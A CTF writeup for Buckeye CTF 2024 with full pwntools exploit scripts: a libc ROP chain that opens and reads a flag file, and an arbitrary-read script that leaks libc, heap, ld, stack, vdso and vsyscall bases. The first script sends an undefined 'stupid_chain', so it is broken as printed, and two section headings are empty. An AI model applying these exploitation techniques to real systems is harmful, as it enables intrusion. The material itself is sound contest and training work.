---
title: Buckeye CTF 2024 
category: WRITEUP, CTF,
date: September 18th, 2024
description: Writeup of a few challenges from buckeye ctf
---


# No Handouts

At first glance this seems to be a simple libc
challenge with them providing us the leak. However, if we look at the remote 
configuration, there are no binaries in the 
system. This means that we can't run execve.

That means that we'll have to do an open, read,
write rop chain. My plan was to use gets to 
read "/app/flag.txt" into a writeable section of the
binary. Then call open on the writable data and then
read. Once the flag has been read in we can just
call puts on the writable flag 


```python
#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little", log_level="debug", os="linux",
        terminal=["alacritty","-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13371


def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def exploit(p,e,l):

    pad = b"A" * 40

    ru(p,b"at ")
    l.address = int(rl(p).strip(b"\n"),16) - l.sym["system"]
    log.info(f"Leaked libc base {hex(l.address)}")


    r = ROP(l)
    pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]

    #flag = b"/srv/app/flag.txt"
    #0x000000000002be51 : pop rsi ; ret
    pop_rsi = l.address + 0x2be51
    #0x00000000000904a9 : pop rdx ; pop rbx ; ret
    pop_rdx_rbx = l.address + 0x904a9
    #0x000000000003d1ee : pop rcx ; ret
    pop_rcx = l.address + 0x3d1ee

    one_gadget = l.address + 0xebd43

    flag = b"flag.txt"

    payload = flag

    writeable_addr = l.address + 0x21ace8

    chain = p64(pop_rdi) + p64(writeable_addr)
    chain += p64(l.sym["gets"])

    # Open /srv/app/flag.txt
    chain += p64(pop_rdi) + p64(writeable_addr)
    chain += p64(pop_rsi) + p64(0)
    chain += p64(l.sym["open"])

    fd = 3 # Possibly brute force this

    # Read in flag
    chain += p64(pop_rdi) + p64(fd) + p64(pop_rsi) + p64(writeable_addr)
    chain += p64(pop_rdx_rbx) + p64(0x30) + p64(0)
    chain += p64(l.sym["read"])

    # Puts flag
    chain += p64(pop_rdi) + p64(writeable_addr)
    chain += p64(l.sym["puts"])

    #sl(p,pad+chain)
    sl(p,pad+stupid_chain)

    sl(p,payload)
    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)

```

# Sailing the C 
This challenge has two parts, the first is where
you can leak anywhere in memory.

In the second part of the program, we have to 
correctly answer the base of each section in the binary.

# Leaking Libc
The first leak we should get is libc as we can
get a lot of other leaks by getting the libc base. 

Simply leaking the address of the got entry for 
puts will get us the libc base.

# Leaking the Heap
We can leak the heap by looking at the main\_arena.
In this case, the chunk that has been malloced is 
at main\_arena + 96. 

# Leaking ld
Next we can use the same method that we used to leak libc
by leaking the libc got entry \_dl\_audit\_preinit.
And then we have ld.

# Leaking vdso and vvar
To leak vdso, we can use the `linkmap` command 
in pwndbg to view the linkmap. The link map will
contain the entry for the base of the vdso. 

Since vvar is generally very close to vdso, we can brute
force it, one page size at a time. 

# Leaking the Stack
The hard part of this is leaking the stack. To 
get a stack value we can leak two libc variables
either `environ`  or `\_\_libc\_argv` which are both 
on the stack. 

However, the problem becomes getting the stack 
base consistently since it changes constantly. That
is when I noticed two things. One, at the end of
the stack is the string argv ('./chall' or '/app/run')
is near the end of the stack. Two, that the stack
is consistently 0x21000 size. 

So my solution to this problem is to leak `\_\_libc\_argv`
and walk down the stack until we see the argv 
that the binary is run from. Once we find the string,
we have found the end of the stack and can subtract
0x21000 and round to get the base of the stack.

# Leaking vsyscall
Thankfully, vsyscall is a constant value so we 
can look in gdb to get the value

```python
#! /usr/bin/python
from pwn import *
import Crypto.Util.number as cun

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 0.5
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13375

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def get_leak(p,e,target):
    #sleep(2)
    try:
        ru(p,b"Where to captain?")
        sl(p,str(target))
        ru(p,b"Good choice! We gathered ")
        leak = int(rl(p).split(b" ")[0])
        log.info(f"Leaked {hex(leak)} at {hex(target)}")
        return leak
    except:
        return 0
        pass


def answer(p,e,answer):

    sleep(2)
    log.info(f"Answering {hex(answer)}")
    ru(p,f"Where in the world is")
    sl(p,str(answer))
    sleep(2)



def exploit(p,e,l,ld):


    # Leak got entry for puts
    got_puts = get_leak(p,e,e.got["puts"])
    l.address = got_puts - 0x80e50
    log.info(f"Leaked libc address {hex(l.address)}")

    # main_arena+96
    heap_leak = get_leak(p,e,l.address + 0x21ace0) - 0x3a0
    log.info(f"Leaked heap adddress {hex(heap_leak)}")

    # Leak ld from libc got _dl_audit_preinit@GLIBC_PRIVATE
    ld.address = get_leak(p,e,l.address + 0x21a1b8) - 0x1b660
    log.info(f"Leaked ld {hex(ld.address)}")

    # Leak stack from __libc_environ
    stack_leak = get_leak(p,e,l.sym["__libc_argv"])

    vdso_ptr = get_leak(p,e,ld.address+0x3b890)
    log.info(f"Leaked vdso ptr {hex(vdso_ptr)}")

    libc_argv = get_leak(p,e,stack_leak)


    # Find base stack
    stack_size = 21000
    stack_addr = libc_argv
    for i in range(0,21000,8):
        #addr = stack_leak + i
        addr = (libc_argv & 0xfffffffffffffff8) + i
        leak = get_leak(p,e,addr)
        leak = cun.long_to_bytes(leak)
        print(leak)

        val = b"llahc/."

        if args.REMOTE:
            val = b"nur/ppa"
        else:
            val = b"llahc/."

        print(f"Val {val} Leak {leak} at {hex(addr)}")
        if (leak == val):
            stack_addr = addr
            log.info(f"found chall at {hex(addr)}")
            break

    start_stack = (stack_addr - 0x21000 + 0x10) & 0xfffffffffffff000
    #start_stack = (stack_addr - 21000 + 0x10)

    #vvar_addr = (stack_addr + 0x9000) & 0xfffffffffffff000
    vvar_addr = vdso_ptr - 0x4000

    log.info(f"Leaked beggining of stack {hex(start_stack)}")

    sl(p,str(0))

    ru(p,b"Back home? Hopefully the king will be pleased...")


    sleep(6)
    ru(p,b"While I am impressed with these riches.. you still must prove you sailed the world.")

    # Base
    if args.REMOTE:
        answer(p,e,4194304)
    else:
        answer(p,e,e.address)

    answer(p,e,heap_leak)
    answer(p,e,l.address)
    answer(p,e,ld.address)
    answer(p,e,start_stack)
    answer(p,e,vvar_addr)
    answer(p,e,vdso_ptr)
    answer(p,e,0xffffffffff600000)

    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")
    ld = ELF("./ld-2.35.so")


    exploit(p,e,l,ld)
```

# Spaceman



# Gent's Favorite Model
